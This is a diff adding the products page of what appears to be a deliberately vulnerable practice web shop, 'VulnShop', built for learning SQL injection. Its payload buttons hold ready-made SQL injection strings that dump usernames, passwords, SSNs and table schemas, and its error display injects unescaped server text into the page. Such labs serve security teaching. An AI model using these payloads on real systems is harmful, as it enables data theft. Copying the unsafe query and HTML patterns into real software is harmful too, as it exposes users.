@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Products - VulnShop</title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-brand">
+            <span class="logo">🛒</span>
+            <span>VulnShop</span>
+            <span class="warning-badge">VULNERABLE</span>
+        </div>
+        <div class="nav-links">
+            <a href="/">Home</a>
+            <a href="/products.html">Products</a>
+            <a href="/banking.html">Banking</a>
+            <a href="/admin.html">Admin</a>
+            <a href="/tools.html">Tools</a>
+        </div>
+    </nav>
+
+    <div class="warning-banner">
+        ⚠️ A05: SQL Injection in Search
+    </div>
+
+    <main class="container">
+        <h1>🛍️ Products</h1>
+
+        <div class="search-section">
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="Search products..." value="">
+                <button onclick="searchProducts()">Search</button>
+            </div>
+
+            <div class="vuln-info-box">
+                <h3>🎯 SQL Injection in Search</h3>
+                <p>The search parameter is directly concatenated into SQL query</p>
+                <div class="payload-list">
+                    <button class="payload-btn" onclick="setSearch(`' OR '1'='1' --`)">Show All Products</button>
+                    <button class="payload-btn" onclick="setSearch(`' UNION SELECT 1,username,password,4 FROM users--`)">Dump Users</button>
+                    <button class="payload-btn" onclick="setSearch(`' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table'--`)">Show Tables</button>
+                    <button class="payload-btn" onclick="setSearch(`' UNION SELECT 1,ssn,email,4 FROM users--`)">Dump SSN</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="sql-display">
+            <h4>Generated SQL Query:</h4>
+            <pre id="sqlQuery">SELECT id, name, description, price FROM products WHERE name LIKE '%<span id="searchTerm"></span>%'</pre>
+        </div>
+
+        <div id="resultsContainer">
+            <h2>Search Results</h2>
+            <div id="productGrid" class="product-grid">
+                <!-- Products will be loaded here -->
+            </div>
+        </div>
+
+        <div id="rawResponse" class="result-box" style="display: none;">
+            <h4>Raw API Response:</h4>
+            <pre id="responseData"></pre>
+        </div>
+    </main>
+
+    <script>
+        // Load all products on page load
+        window.onload = () => searchProducts();
+
+        function setSearch(payload) {
+            document.getElementById('searchInput').value = payload;
+            searchProducts();
+        }
+
+        async function searchProducts() {
+            const query = document.getElementById('searchInput').value;
+            const productGrid = document.getElementById('productGrid');
+            const rawResponse = document.getElementById('rawResponse');
+            const responseData = document.getElementById('responseData');
+
+            document.getElementById('searchTerm').textContent = query;
+
+            try {
+                const response = await fetch(`/api/search?q=${encodeURIComponent(query)}`);
+                const data = await response.json();
+
+                rawResponse.style.display = 'block';
+                responseData.textContent = JSON.stringify(data, null, 2);
+
+                if (data.error) {
+                    productGrid.innerHTML = `
+                        <div class="error-card">
+                            <h3>❌ SQL Error</h3>
+                            <p>${data.error}</p>
+                            ${data.query ? `<pre>${data.query}</pre>` : ''}
+                        </div>
+                    `;
+                    return;
+                }
+
+                if (data.length === 0) {
+                    productGrid.innerHTML = '<p>No products found</p>';
+                    return;
+                }
+
+                productGrid.innerHTML = data.map(product => `
+                    <div class="product-card">
+                        <h3>${escapeHtml(String(product.name || product[1] || 'N/A'))}</h3>
+                        <p>${escapeHtml(String(product.description || product[2] || 'N/A'))}</p>
+                        <div class="price">$${product.price || product[3] || '0.00'}</div>
+                        <button class="btn">Add to Cart</button>
+                    </div>
+                `).join('');
+
+            } catch (error) {
+                productGrid.innerHTML = `<div class="error-card"><h3>Error</h3><p>${error.message}</p></div>`;
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+    </script>
+</body>
+</html>
